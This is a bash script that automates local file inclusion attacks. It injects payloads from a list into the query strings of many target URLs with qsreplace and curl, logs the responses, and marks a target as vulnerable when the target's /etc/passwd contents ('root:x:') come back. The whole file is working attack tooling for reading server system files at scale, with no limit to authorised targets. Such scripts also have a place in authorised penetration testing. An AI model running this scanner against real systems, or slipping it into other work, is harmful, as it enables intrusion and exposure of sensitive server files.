#!/bin/bash

# Default values
url_file="lfi-urls.txt"
payload_file="payloads.txt"
output_file="output.txt"
delay=0  # No delay by default

# Help function
usage() {
  echo "Usage: $0 [-u url_file] [-p payload_file] [-o output_file] [-d delay]"
  echo "  -u url_file      File containing URLs (default: lfi-urls.txt)"
  echo "  -p payload_file  File containing LFI payloads (default: payloads.txt)"
  echo "  -o output_file   File to save the output (default: output.txt)"
  echo "  -d delay         Delay in seconds between requests (default: 0)"
  exit 1
}

# Parse command-line arguments
while getopts ":u:p:o:d:h" opt; do
  case $opt in
    u) url_file="$OPTARG" ;;
    p) payload_file="$OPTARG" ;;
    o) output_file="$OPTARG" ;;
    d) delay="$OPTARG" ;;
    h) usage ;;
    \?) echo "Invalid option: -$OPTARG" >&2; usage ;;
    :) echo "Option -$OPTARG requires an argument." >&2; usage ;;
  esac
done

# Clear the output file
echo "" > "$output_file"

# Check if files exist
if [[ ! -f "$url_file" ]]; then
  echo "URL file not found: $url_file"
  exit 1
fi

if [[ ! -f "$payload_file" ]]; then
  echo "Payload file not found: $payload_file"
  exit 1
fi

# Main logic
while read -r url; do
  while read -r payload; do
    modified_url=$(echo "$url" | qsreplace "$payload")
    
    response=$(curl -silent -I -w "%{http_code}\n" "$modified_url")
    response_code=$(echo "$response" | tail -n1)
    response_title=$(curl -silent "$modified_url" | grep -o '<title>[^<]*' | sed 's/<title>//')

    # Print details to terminal
    echo "URL: $modified_url"
    echo "Response Code: $response_code"
    echo "Response Title: $response_title"

    # Save details to output file
    echo "URL: $modified_url" >> "$output_file"
    echo "Response Code: $response_code" >> "$output_file"
    echo "Response Title: $response_title" >> "$output_file"
    
    if curl -silent "$modified_url" | grep -q "root:x:"; then
      echo -e "\e[31m$modified_url is vulnerable\e[0m"
      echo "$modified_url is vulnerable" >> "$output_file"
    fi
    
    echo "----------------------------------------"
    echo "----------------------------------------" >> "$output_file"

    # Delay between requests
    sleep "$delay"
    
  done < "$payload_file"
done < "$url_file"